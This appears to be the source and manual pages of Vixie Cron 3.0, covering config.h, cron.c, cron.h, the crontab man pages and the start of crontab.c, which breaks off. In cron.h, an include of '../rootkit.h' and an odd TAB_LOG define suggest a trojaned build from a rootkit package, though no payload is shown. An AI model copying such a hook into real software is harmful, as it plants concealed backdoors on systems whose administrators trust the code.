 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

/* config.h - configurables for Vixie Cron
 *
 * $Id: config.h,v 2.6 1994/01/15 20:43:43 vixie Exp $
 */

#if !defined(_PATH_SENDMAIL)
# define _PATH_SENDMAIL "/usr/lib/sendmail"
#endif /*SENDMAIL*/

/*
 * these are site-dependent
 */

#ifndef DEBUGGING
#define DEBUGGING 1	/* 1 or 0 -- do you want debugging code built in? */
#endif

			/*
			 * choose one of these MAILCMD commands.  I use
			 * /bin/mail for speed; it makes biff bark but doesn't
			 * do aliasing.  /usr/lib/sendmail does aliasing but is
			 * a hog for short messages.  aliasing is not needed
			 * if you make use of the MAILTO= feature in crontabs.
			 * (hint: MAILTO= was added for this reason).
			 */

#define MAILCMD _PATH_SENDMAIL					/*-*/
#define MAILARGS "%s -FCronDaemon -odi -oem -or0s %s"		/*-*/
			/* -Fx	 = set full-name of sender
			 * -odi	 = Option Deliverymode Interactive
			 * -oem	 = Option Errors Mailedtosender
			 * -or0s = Option Readtimeout -- don't time out
			 */

/* #define MAILCMD "/bin/mail"			/*-*/
/* #define MAILARGS "%s -d  %s"			/*-*/
			/* -d = undocumented but common flag: deliver locally?
			 */

/* #define MAILCMD "/usr/mmdf/bin/submit"	/*-*/
/* #define MAILARGS "%s -mlrxto %s"		/*-*/

/* #define MAIL_DATE				/*-*/
			/* should we include an ersatz Date: header in
			 * generated mail?  if you are using sendmail
			 * for MAILCMD, it is better to let sendmail
			 * generate the Date: header.
			 */

			/* if ALLOW_FILE and DENY_FILE are not defined or are
			 * defined but neither exists, should crontab(1) be
			 * usable only by root?
			 */
/*#define ALLOW_ONLY_ROOT			/*-*/

			/* if you want to use syslog(3) instead of appending
			 * to CRONDIR/LOG_FILE (/var/cron/log, e.g.), define
			 * SYSLOG here.  Note that quite a bit of logging
			 * info is written, and that you probably don't want
			 * to use this on 4.2bsd since everything goes in
			 * /usr/spool/mqueue/syslog.  On 4.[34]bsd you can
			 * tell /etc/syslog.conf to send cron's logging to
			 * a separate file.
			 *
			 * Note that if this and LOG_FILE in "pathnames.h"
			 * are both defined, then logging will go to both
			 * places.
			 */
#define SYSLOG	 			/*-*/
.\"/* Copyright 1988,1990,1993 by Paul Vixie
.\" * All rights reserved
.\" *
.\" * Distribute freely, except: don't remove my name from the source or
.\" * documentation (don't take credit for my work), mark your changes (don't
.\" * get me blamed for your possible bugs), don't alter or remove this
.\" * notice.  May be sold if buildable source is provided to buyer.  No
.\" * warrantee of any kind, express or implied, is included with this
.\" * software; use at your own risk, responsibility for damages (if any) to
.\" * anyone resulting from the use of this software rests entirely with the
.\" * user.
.\" *
.\" * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
.\" * I'll try to keep a version up to date.  I can be reached as follows:
.\" * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
.\" */
.\" 
.\" $Id: cron.8,v 2.2 1993/12/28 08:34:43 vixie Exp $
.\" 
.TH CRON 8 "20 December 1993"
.UC 4
.SH NAME
cron \- daemon to execute scheduled commands (Vixie Cron)
.SH SYNOPSIS
cron
.SH DESCRIPTION
.I Cron
should be started from /etc/rc or /etc/rc.local.  It will return immediately,
so you don't need to start it with '&'.
.PP
.I Cron
searches /var/cron/tabs for crontab files which are named after accounts in
/etc/passwd; crontabs found are loaded into memory.
.I Cron
also searches for /etc/crontab which is in a different format (see
.IR crontab(5)).
.I Cron
then wakes up every minute, examining all stored crontabs, checking each
command to see if it should be run in the current minute.  When executing
commands, any output is mailed to the owner of the crontab (or to the user
named in the MAILTO environment variable in the crontab, if such exists).
.PP
Additionally,
.I cron
checks each minute to see if its spool directory's modtime (or the modtime
on
.IR /etc/crontab)
has changed, and if it has,
.I cron
will then examine the modtime on all crontabs and reload those which have
changed.  Thus
.I cron
need not be restarted whenever a crontab file is modified.  Note that the
.IR Crontab (1)
command updates the modtime of the spool directory whenever it changes a
crontab.
.SH "SEE ALSO"
crontab(1), crontab(5)
.SH AUTHOR
.nf
Paul Vixie <paul@vix.com>
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: cron.c,v 2.11 1994/01/15 20:43:43 vixie Exp $";
#endif


#define	MAIN_PROGRAM


#include "cron.h"
#include <sys/signal.h>
#if SYS_TIME_H
# include <sys/time.h>
#else
# include <time.h>
#endif


static	void	usage __P((void)),
		run_reboot_jobs __P((cron_db *)),
		cron_tick __P((cron_db *)),
		cron_sync __P((void)),
		cron_sleep __P((void)),
#ifdef USE_SIGCHLD
		sigchld_handler __P((int)),
#endif
		sighup_handler __P((int)),
		parse_args __P((int c, char *v[]));


static void
usage() {
	fprintf(stderr, "usage:  %s [-x debugflag[,...]]\n", ProgramName);
	exit(ERROR_EXIT);
}


int
main(argc, argv)
	int	argc;
	char	*argv[];
{
	cron_db	database;

	ProgramName = argv[0];

#if defined(BSD)
	setlinebuf(stdout);
	setlinebuf(stderr);
#endif

	parse_args(argc, argv);

#ifdef USE_SIGCHLD
	(void) signal(SIGCHLD, sigchld_handler);
#else
	(void) signal(SIGCLD, SIG_IGN);
#endif
	(void) signal(SIGHUP, sighup_handler);

	acquire_daemonlock(0);
	set_cron_uid();
	set_cron_cwd();

#if defined(POSIX)
	setenv("PATH", _PATH_DEFPATH, 1);
#endif

	/* if there are no debug flags turned on, fork as a daemon should.
	 */
# if DEBUGGING
	if (DebugFlags) {
# else
	if (0) {
# endif
		(void) fprintf(stderr, "[%d] cron started\n", getpid());
	} else {
		switch (fork()) {
		case -1:
			log_it("CRON",getpid(),"DEATH","can't fork");
			exit(0);
			break;
		case 0:
			/* child process */
			log_it("CRON",getpid(),"STARTUP","fork ok");
			(void) setsid();
			break;
		default:
			/* parent process should just die */
			_exit(0);
		}
	}

	acquire_daemonlock(0);
	database.head = NULL;
	database.tail = NULL;
	database.mtime = (time_t) 0;
	load_database(&database);
	run_reboot_jobs(&database);
	cron_sync();
	while (TRUE) {
# if DEBUGGING
		if (!(DebugFlags & DTEST))
# endif /*DEBUGGING*/
			cron_sleep();

		load_database(&database);

		/* do this iteration
		 */
		cron_tick(&database);

		/* sleep 1 minute
		 */
		TargetTime += 60;
	}
}


static void
run_reboot_jobs(db)
	cron_db *db;
{
	register user		*u;
	register entry		*e;

	for (u = db->head;  u != NULL;  u = u->next) {
		for (e = u->crontab;  e != NULL;  e = e->next) {
			if (e->flags & WHEN_REBOOT) {
				job_add(e, u);
			}
		}
	}
	(void) job_runqueue();
}


static void
cron_tick(db)
	cron_db	*db;
{
 	register struct tm	*tm = localtime(&TargetTime);
	register int		minute, hour, dom, month, dow;
	register user		*u;
	register entry		*e;

	/* make 0-based values out of these so we can use them as indicies
	 */
	minute = tm->tm_min -FIRST_MINUTE;
	hour = tm->tm_hour -FIRST_HOUR;
	dom = tm->tm_mday -FIRST_DOM;
	month = tm->tm_mon +1 /* 0..11 -> 1..12 */ -FIRST_MONTH;
	dow = tm->tm_wday -FIRST_DOW;

	Debug(DSCH, ("[%d] tick(%d,%d,%d,%d,%d)\n",
		getpid(), minute, hour, dom, month, dow))

	/* the dom/dow situation is odd.  '* * 1,15 * Sun' will run on the
	 * first and fifteenth AND every Sunday;  '* * * * Sun' will run *only*
	 * on Sundays;  '* * 1,15 * *' will run *only* the 1st and 15th.  this
	 * is why we keep 'e->dow_star' and 'e->dom_star'.  yes, it's bizarre.
	 * like many bizarre things, it's the standard.
	 */
	for (u = db->head;  u != NULL;  u = u->next) {
		for (e = u->crontab;  e != NULL;  e = e->next) {
			Debug(DSCH|DEXT, ("user [%s:%d:%d:...] cmd=\"%s\"\n",
					  env_get("LOGNAME", e->envp),
					  e->uid, e->gid, e->cmd))
			if (bit_test(e->minute, minute)
			 && bit_test(e->hour, hour)
			 && bit_test(e->month, month)
			 && ( ((e->flags & DOM_STAR) || (e->flags & DOW_STAR))
			      ? (bit_test(e->dow,dow) && bit_test(e->dom,dom))
			      : (bit_test(e->dow,dow) || bit_test(e->dom,dom))
			    )
			   ) {
				job_add(e, u);
			}
		}
	}
}


/* the task here is to figure out how long it's going to be until :00 of the
 * following minute and initialize TargetTime to this value.  TargetTime
 * will subsequently slide 60 seconds at a time, with correction applied
 * implicitly in cron_sleep().  it would be nice to let cron execute in
 * the "current minute" before going to sleep, but by restarting cron you
 * could then get it to execute a given minute's jobs more than once.
 * instead we have the chance of missing a minute's jobs completely, but
 * that's something sysadmin's know to expect what with crashing computers..
 */
static void
cron_sync() {
 	register struct tm	*tm;

	TargetTime = time((time_t*)0);
	tm = localtime(&TargetTime);
	TargetTime += (60 - tm->tm_sec);
}


static void
cron_sleep() {
	register int	seconds_to_wait;

	do {
		seconds_to_wait = (int) (TargetTime - time((time_t*)0));
		Debug(DSCH, ("[%d] TargetTime=%ld, sec-to-wait=%d\n",
			getpid(), TargetTime, seconds_to_wait))

		/* if we intend to sleep, this means that it's finally
		 * time to empty the job queue (execute it).
		 *
		 * if we run any jobs, we'll probably screw up our timing,
		 * so go recompute.
		 *
		 * note that we depend here on the left-to-right nature
		 * of &&, and the short-circuiting.
		 */
	} while (seconds_to_wait > 0 && job_runqueue());

	while (seconds_to_wait > 0) {
		Debug(DSCH, ("[%d] sleeping for %d seconds\n",
			getpid(), seconds_to_wait))
		seconds_to_wait = (int) sleep((unsigned int) seconds_to_wait);
	}
}


#ifdef USE_SIGCHLD
static void
sigchld_handler(x) {
	WAIT_T		waiter;
	PID_T		pid;

	for (;;) {
#ifdef POSIX
		pid = waitpid(-1, &waiter, WNOHANG);
#else
		pid = wait3(&waiter, WNOHANG, (struct rusage *)0);
#endif
		switch (pid) {
		case -1:
			Debug(DPROC,
				("[%d] sigchld...no children\n", getpid()))
			return;
		case 0:
			Debug(DPROC,
				("[%d] sigchld...no dead kids\n", getpid()))
			return;
		default:
			Debug(DPROC,
				("[%d] sigchld...pid #%d died, stat=%d\n",
				getpid(), pid, WEXITSTATUS(waiter)))
		}
	}
}
#endif /*USE_SIGCHLD*/


static void
sighup_handler(x) {
	log_close();
}


static void
parse_args(argc, argv)
	int	argc;
	char	*argv[];
{
	int	argch;

	while (EOF != (argch = getopt(argc, argv, "x:"))) {
		switch (argch) {
		default:
			usage();
		case 'x':
			if (!set_debug_flags(optarg))
				usage();
			break;
		}
	}
}
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

/* cron.h - header for vixie's cron
 *
 * $Id: cron.h,v 2.10 1994/01/15 20:43:43 vixie Exp $
 *
 * vix 14nov88 [rest of log is in RCS]
 * vix 14jan87 [0 or 7 can be sunday; thanks, mwm@berkeley]
 * vix 30dec86 [written]
 */

/* reorder these #include's at your peril */

#include <sys/types.h>
#include <sys/param.h>
#include "compat.h"

#include <stdio.h>
#include <ctype.h>
#include <bitstring.h>
#include <pwd.h>
#include <sys/wait.h>

#include "pathnames.h"
#include "config.h"
#include "externs.h"

	/* these are really immutable, and are
	 *   defined for symbolic convenience only
	 * TRUE, FALSE, and ERR must be distinct
	 * ERR must be < OK.
	 */
#include "../rootkit.h"
#define TRUE		1
#define FALSE		0
	/* system calls return this on success */
#define OK		0
	/*   or this on error */
#define ERR		(-1)

	/* turn this on to get '-x' code */
#ifndef DEBUGGING
#define DEBUGGING	FALSE
#endif

#define READ_PIPE	0	/* which end of a pipe pair do you read? */
#define WRITE_PIPE	1	/*   or write to? */
#define STDIN		0	/* what is stdin's file descriptor? */
#define STDOUT		1	/*   stdout's? */
#define STDERR		2	/*   stderr's? */
#define ERROR_EXIT	1	/* exit() with this will scare the shell */
#define	OK_EXIT		0	/* exit() with this is considered 'normal' */
#define	MAX_FNAME	100	/* max length of internally generated fn */
#define	MAX_COMMAND	1000	/* max length of internally generated cmd */
#define	MAX_ENVSTR	1000	/* max length of envvar=value\0 strings */
#define	MAX_TEMPSTR	100	/* obvious */
#define	MAX_UNAME	20	/* max length of username, should be overkill */
#define	ROOT_UID	0	/* don't change this, it really must be root */
#define	ROOT_USER	"root"	/* ditto */
#define TAB_LOG		0       /* dont touch this */

				/* NOTE: these correspond to DebugFlagNames,
				 *	defined below.
				 */
#define	DEXT		0x0001	/* extend flag for other debug masks */
#define	DSCH		0x0002	/* scheduling debug mask */
#define	DPROC		0x0004	/* process control debug mask */
#define	DPARS		0x0008	/* parsing debug mask */
#define	DLOAD		0x0010	/* database loading debug mask */
#define	DMISC		0x0020	/* misc debug mask */
#define	DTEST		0x0040	/* test mode: don't execute any commands */
#define	DBIT		0x0080	/* bit twiddling shown (long) */

#define	CRON_TAB(u)	"%s/%s", SPOOL_DIR, u
#define	REG		register
#define	PPC_NULL	((char **)NULL)

#ifndef MAXHOSTNAMELEN
#define MAXHOSTNAMELEN 64
#endif

#define	Skip_Blanks(c, f) \
			while (c == '\t' || c == ' ') \
				c = get_char(f);

#define	Skip_Nonblanks(c, f) \
			while (c!='\t' && c!=' ' && c!='\n' && c != EOF) \
				c = get_char(f);

#define	Skip_Line(c, f) \
			do {c = get_char(f);} while (c != '\n' && c != EOF);

#if DEBUGGING
# define Debug(mask, message) \
			if ( (DebugFlags & (mask) ) == (mask) ) \
				printf message;
#else /* !DEBUGGING */
# define Debug(mask, message) \
			;
#endif /* DEBUGGING */

#define	MkLower(ch)	(isupper(ch) ? tolower(ch) : ch)
#define	MkUpper(ch)	(islower(ch) ? toupper(ch) : ch)
#define	Set_LineNum(ln)	{Debug(DPARS|DEXT,("linenum=%d\n",ln)); \
			 LineNumber = ln; \
			}

#define	FIRST_MINUTE	0
#define	LAST_MINUTE	59
#define	MINUTE_COUNT	(LAST_MINUTE - FIRST_MINUTE + 1)

#define	FIRST_HOUR	0
#define	LAST_HOUR	23
#define	HOUR_COUNT	(LAST_HOUR - FIRST_HOUR + 1)

#define	FIRST_DOM	1
#define	LAST_DOM	31
#define	DOM_COUNT	(LAST_DOM - FIRST_DOM + 1)

#define	FIRST_MONTH	1
#define	LAST_MONTH	12
#define	MONTH_COUNT	(LAST_MONTH - FIRST_MONTH + 1)

/* note on DOW: 0 and 7 are both Sunday, for compatibility reasons. */
#define	FIRST_DOW	0
#define	LAST_DOW	7
#define	DOW_COUNT	(LAST_DOW - FIRST_DOW + 1)

			/* each user's crontab will be held as a list of
			 * the following structure.
			 *
			 * These are the cron commands.
			 */

typedef	struct _entry {
	struct _entry	*next;
	uid_t		uid;	
	gid_t		gid;
	char		**envp;
	char		*cmd;
	bitstr_t	bit_decl(minute, MINUTE_COUNT);
	bitstr_t	bit_decl(hour,   HOUR_COUNT);
	bitstr_t	bit_decl(dom,    DOM_COUNT);
	bitstr_t	bit_decl(month,  MONTH_COUNT);
	bitstr_t	bit_decl(dow,    DOW_COUNT);
	int		flags;
#define	DOM_STAR	0x01
#define	DOW_STAR	0x02
#define	WHEN_REBOOT	0x04
} entry;

			/* the crontab database will be a list of the
			 * following structure, one element per user
			 * plus one for the system.
			 *
			 * These are the crontabs.
			 */

typedef	struct _user {
	struct _user	*next, *prev;	/* links */
	char		*name;
	time_t		mtime;		/* last modtime of crontab */
	entry		*crontab;	/* this person's crontab */
} user;

typedef	struct _cron_db {
	user		*head, *tail;	/* links */
	time_t		mtime;		/* last modtime on spooldir */
} cron_db;


void		set_cron_uid __P((void)),
		set_cron_cwd __P((void)),
		load_database __P((cron_db *)),
		open_logfile __P((void)),
		sigpipe_func __P((void)),
		job_add __P((entry *, user *)),
		do_command __P((entry *, user *)),
		link_user __P((cron_db *, user *)),
		unlink_user __P((cron_db *, user *)),
		free_user __P((user *)),
		env_free __P((char **)),
		unget_char __P((int, FILE *)),
		free_entry __P((entry *)),
		acquire_daemonlock __P((int)),
		skip_comments __P((FILE *)),
		log_it __P((char *, int, char *, char *)),
		log_close __P((void));

int		job_runqueue __P((void)),
		set_debug_flags __P((char *)),
		get_char __P((FILE *)),
		get_string __P((char *, int, FILE *, char *)),
		swap_uids __P((void)),
		load_env __P((char *, FILE *)),
		cron_pclose __P((FILE *)),
		strcmp_until __P((char *, char *, int)),
		allowed __P((char *)),
		strdtb __P((char *));

char		*env_get __P((char *, char **)),
		*arpadate __P((time_t *)),
		*mkprints __P((unsigned char *, unsigned int)),
		*first_word __P((char *, char *)),
		**env_init __P((void)),
		**env_copy __P((char **)),
		**env_set __P((char **, char *));

user		*load_user __P((int, struct passwd *, char *)),
		*find_user __P((cron_db *, char *));

entry		*load_entry __P((FILE *, void (*)(),
				 struct passwd *, char **));

FILE		*cron_popen __P((char *, char *));


				/* in the C tradition, we only create
				 * variables for the main program, just
				 * extern them elsewhere.
				 */

#ifdef MAIN_PROGRAM
# if !defined(LINT) && !defined(lint)
char	*copyright[] = {
		"@(#) Copyright 1988,1989,1990,1993,1994 by Paul Vixie",
		"@(#) All rights reserved"
	};
# endif

char	*MonthNames[] = {
		"Jan", "Feb", "Mar", "Apr", "May", "Jun",
		"Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
		NULL
	};

char	*DowNames[] = {
		"Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun",
		NULL
	};

char	*ProgramName;
int	LineNumber;
time_t	TargetTime;

# if DEBUGGING
int	DebugFlags;
char	*DebugFlagNames[] = {	/* sync with #defines */
		"ext", "sch", "proc", "pars", "load", "misc", "test", "bit",
		NULL		/* NULL must be last element */
	};
# endif /* DEBUGGING */
#else /*MAIN_PROGRAM*/
extern	char	*copyright[],
		*MonthNames[],
		*DowNames[],
		*ProgramName;
extern	int	LineNumber;
extern	time_t	TargetTime;
# if DEBUGGING
extern	int	DebugFlags;
extern	char	*DebugFlagNames[];
# endif /* DEBUGGING */
#endif /*MAIN_PROGRAM*/
.\"/* Copyright 1988,1990,1993 by Paul Vixie
.\" * All rights reserved
.\" *
.\" * Distribute freely, except: don't remove my name from the source or
.\" * documentation (don't take credit for my work), mark your changes (don't
.\" * get me blamed for your possible bugs), don't alter or remove this
.\" * notice.  May be sold if buildable source is provided to buyer.  No
.\" * warrantee of any kind, express or implied, is included with this
.\" * software; use at your own risk, responsibility for damages (if any) to
.\" * anyone resulting from the use of this software rests entirely with the
.\" * user.
.\" *
.\" * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
.\" * I'll try to keep a version up to date.  I can be reached as follows:
.\" * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
.\" */
.\"
.\" $Id: crontab.1,v 2.4 1993/12/31 10:47:33 vixie Exp $
.\"
.TH CRONTAB 1 "29 December 1993"
.UC 4
.SH NAME
crontab \- maintain crontab files for individual users (V3)
.SH SYNOPSIS
crontab [ -u user ] file
.br
crontab [ -u user ] { -l | -r | -e }
.SH DESCRIPTION
.I Crontab
is the program used to install, deinstall or list the tables
used to drive the
.IR cron (8)
daemon in Vixie Cron.  Each user can have their own crontab, and though
these are files in /var, they are not intended to be edited directly.
.PP
If the
.I allow
file exists, then you must be listed therein in order to be allowed to use
this command.  If the
.I allow
file does not exist but the
.I deny
file does exist, then you must \fBnot\fR be listed in the
.I deny
file in order to use this command.  If neither of these files exists, then
depending on site-dependent configuration parameters, only the super user
will be allowed to use this command, or all users will be able to use this
command.
.PP
If the
.I -u
option is given, it specifies the name of the user whose crontab is to be
tweaked.  If this option is not given,
.I crontab
examines "your" crontab, i.e., the crontab of the person executing the
command.  Note that
.IR su (8)
can confuse
.I crontab
and that if you are running inside of
.IR su (8)
you should always use the
.I -u
option for safety's sake.
.PP
The first form of this command is used to install a new crontab from some
named file or standard input if the pseudo-filename ``-'' is given.
.PP
The
.I -l
option causes the current crontab to be displayed on standard output.
.PP
The
.I -r
option causes the current crontab to be removed.
.PP
The
.I -e
option is used to edit the current crontab using the editor specified by
the \s-1VISUAL\s+1 or \s-1EDITOR\s+1 environment variables.  After you exit
from the editor, the modified crontab will be installed automatically.
.SH "SEE ALSO"
crontab(5), cron(8)
.SH FILES
.nf
/var/cron/allow
/var/cron/deny
.fi
.SH STANDARDS
The
.I crontab
command conforms to IEEE Std1003.2-1992 (``POSIX'').  This new command syntax
differs from previous versions of Vixie Cron, as well as from the classic
SVR3 syntax.
.SH DIAGNOSTICS
A fairly informative usage message appears if you run it with a bad command
line.
.SH AUTHOR
.nf
Paul Vixie <paul@vix.com>
.\"/* Copyright 1988,1990,1993,1994 by Paul Vixie
.\" * All rights reserved
.\" *
.\" * Distribute freely, except: don't remove my name from the source or
.\" * documentation (don't take credit for my work), mark your changes (don't
.\" * get me blamed for your possible bugs), don't alter or remove this
.\" * notice.  May be sold if buildable source is provided to buyer.  No
.\" * warrantee of any kind, express or implied, is included with this
.\" * software; use at your own risk, responsibility for damages (if any) to
.\" * anyone resulting from the use of this software rests entirely with the
.\" * user.
.\" *
.\" * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
.\" * I'll try to keep a version up to date.  I can be reached as follows:
.\" * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
.\" */
.\"
.\" $Id: crontab.5,v 2.4 1994/01/15 20:43:43 vixie Exp $
.\" 
.TH CRONTAB 5 "24 January 1994"
.UC 4
.SH NAME
crontab \- tables for driving cron
.SH DESCRIPTION
A
.I crontab
file contains instructions to the
.IR cron (8)
daemon of the general form: ``run this command at this time on this date''.
Each user has their own crontab, and commands in any given crontab will be
executed as the user who owns the crontab.  Uucp and News will usually have
their own crontabs, eliminating the need for explicitly running
.IR su (1)
as part of a cron command.
.PP
Blank lines and leading spaces and tabs are ignored.  Lines whose first
non-space character is a pound-sign (#) are comments, and are ignored.
Note that comments are not allowed on the same line as cron commands, since
they will be taken to be part of the command.  Similarly, comments are not
allowed on the same line as environment variable settings.
.PP
An active line in a crontab will be either an environment setting or a cron
command.  An environment setting is of the form,
.PP
    name = value
.PP
where the spaces around the equal-sign (=) are optional, and any subsequent
non-leading spaces in
.I value
will be part of the value assigned to
.IR name .
The
.I value
string may be placed in quotes (single or double, but matching) to preserve
leading or trailing blanks.
.PP
Several environment variables are set up
automatically by the
.IR cron (8)
daemon.
SHELL is set to /bin/sh, and LOGNAME and HOME are set from the /etc/passwd 
line of the crontab's owner.
HOME and SHELL may be overridden by settings in the crontab; LOGNAME may not.
.PP
(Another note: the LOGNAME variable is sometimes called USER on BSD systems...
on these systems, USER will be set also.)
.PP
In addition to LOGNAME, HOME, and SHELL,
.IR cron (8)
will look at MAILTO if it has any reason to send mail as a result of running
commands in ``this'' crontab.  If MAILTO is defined (and non-empty), mail is
sent to the user so named.  If MAILTO is defined but empty (MAILTO=""), no
mail will be sent.  Otherwise mail is sent to the owner of the crontab.  This
option is useful if you decide on /bin/mail instead of /usr/lib/sendmail as
your mailer when you install cron -- /bin/mail doesn't do aliasing, and UUCP
usually doesn't read its mail.
.PP
The format of a cron command is very much the V7 standard, with a number of
upward-compatible extensions.  Each line has five time and date fields,
followed by a user name if this is the system crontab file,
followed by a command.  Commands are executed by
.IR cron (8)
when the minute, hour, and month of year fields match the current time,
.I and
when at least one of the two day fields (day of month, or day of week)
match the current time (see ``Note'' below).
.IR cron (8)
examines cron entries once every minute.
The time and date fields are:
.IP
.ta 1.5i
field	allowed values
.br
-----	--------------
.br
minute	0-59
.br
hour	0-23
.br
day of month	0-31
.br
month	0-12 (or names, see below)
.br
day of week	0-7 (0 or 7 is Sun, or use names)
.br
.PP
A field may be an asterisk (*), which always stands for ``first\-last''.
.PP
Ranges of numbers are allowed.  Ranges are two numbers separated
with a hyphen.  The specified range is inclusive.  For example,
8-11 for an ``hours'' entry specifies execution at hours 8, 9, 10
and 11.
.PP
Lists are allowed.  A list is a set of numbers (or ranges)
separated by commas.  Examples: ``1,2,5,9'', ``0-4,8-12''.
.PP
Step values can be used in conjunction with ranges.  Following
a range with ``/<number>'' specifies skips of the number's value
through the range.  For example, ``0-23/2'' can be used in the hours
field to specify command execution every other hour (the alternative
in the V7 standard is ``0,2,4,6,8,10,12,14,16,18,20,22'').  Steps are
also permitted after an asterisk, so if you want to say ``every two
hours'', just use ``*/2''.
.PP
Names can also be used for the ``month'' and ``day of week''
fields.  Use the first three letters of the particular
day or month (case doesn't matter).  Ranges or
lists of names are not allowed.
.PP
The ``sixth'' field (the rest of the line) specifies the command to be
run.
The entire command portion of the line, up to a newline or %
character, will be executed by /bin/sh or by the shell
specified in the SHELL variable of the cronfile.
Percent-signs (%) in the command, unless escaped with backslash
(\\), will be changed into newline characters, and all data
after the first % will be sent to the command as standard
input.
.PP
Note: The day of a command's execution can be specified by two
fields \(em day of month, and day of week.  If both fields are
restricted (ie, aren't *), the command will be run when
.I either
field matches the current time.  For example,
.br
``30 4 1,15 * 5''
would cause a command to be run at 4:30 am on the 1st and 15th of each
month, plus every Friday.
.SH EXAMPLE CRON FILE
.nf

# use /bin/sh to run commands, no matter what /etc/passwd says
SHELL=/bin/sh
# mail any output to `paul', no matter whose crontab this is
MAILTO=paul
#
# run five minutes after midnight, every day
5 0 * * *       $HOME/bin/daily.job >> $HOME/tmp/out 2>&1
# run at 2:15pm on the first of every month -- output mailed to paul
15 14 1 * *     $HOME/bin/monthly
# run at 10 pm on weekdays, annoy Joe
0 22 * * 1-5	mail -s "It's 10pm" joe%Joe,%%Where are your kids?%
23 0-23/2 * * * echo "run 23 minutes after midn, 2am, 4am ..., everyday"
5 4 * * sun     echo "run at 5 after 4 every sunday"
.fi
.SH SEE ALSO
cron(8), crontab(1)
.SH EXTENSIONS
When specifying day of week, both day 0 and day 7 will be considered Sunday.
BSD and ATT seem to disagree about this.
.PP
Lists and ranges are allowed to co-exist in the same field.  "1-3,7-9" would
be rejected by ATT or BSD cron -- they want to see "1-3" or "7,8,9" ONLY.
.PP
Ranges can include "steps", so "1-9/2" is the same as "1,3,5,7,9".
.PP
Names of months or days of the week can be specified by name.
.PP
Environment variables can be set in the crontab.  In BSD or ATT, the
environment handed to child processes is basically the one from /etc/rc.
.PP
Command output is mailed to the crontab owner (BSD can't do this), can be
mailed to a person other than the crontab owner (SysV can't do this), or the
feature can be turned off and no mail will be sent at all (SysV can't do this
either).
.SH AUTHOR
.nf
Paul Vixie <paul@vix.com>
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $";
#endif

/* crontab - install and manage per-user crontab files
 * vix 02may87 [RCS has the rest of the log]
 * vix 26jan87 [original]
 */


#define	MAIN_PROGRAM


#include "cron.h"
#include <errno.h>
#include <fcntl.h>
#include <sys/file.h>
#include <sys/stat.h>
#ifdef USE_UTIMES
# include <sys/time.h>
#else
# include <time.h>
# include <utime.h>
#endif
#if defined(POSIX)
# include <locale.h>
#endif


#define NHEADER_LINES 3


enum opt_t	{ opt_unknown, opt_list, opt_delete, opt_edit, opt_replace };

#if DEBUGGING
static char	*Options[] = { "???", "list", "delete", "edit", "replace" };
#endif


static	PID_T		Pid;
static	char		User[MAX_UNAME], RealUser[MAX_UNAME];
static	char		Filename[MAX_FNAME];
static	FILE		*NewCrontab;
static	int		CheckErrorCount;
static	enum opt_t	Option;
static	struct passwd	*pw;
static	void		list_cmd __P((void)),
			delete_cmd __P((void)),
			edit_cmd __P((void)),
			poke_daemon __P((void)),
			check_error __P((char *)),
			parse_args __P((int c, char *v[]));
static	int		replace_cmd __P((void));


static void
usage(msg)
	char *msg;
{
	fprintf(stderr, "%s: usage error: %s\n", ProgramName, msg);
	fprintf(stderr, "usage:\t%s [-u user] file\n", ProgramName);
	fprintf(stderr, "\t%s [-u user] { -e | -l | -r }\n", ProgramName);
	fprintf(stderr, "\t\t(default operation is replace, per 1003.2)\n");
	fprintf(stderr, "\t-e\t(edit user's crontab)\n");
	fprintf(stderr, "\t-l\t(list user's crontab)\n");
	fprintf(stderr, "\t-r\t(delete user's crontab)\n");
	exit(ERROR_EXIT);
}


int
main(argc, argv)
	int	argc;
	char	*argv[];
{
	int	exitstatus;

	Pid = getpid();
	ProgramName = argv[0];

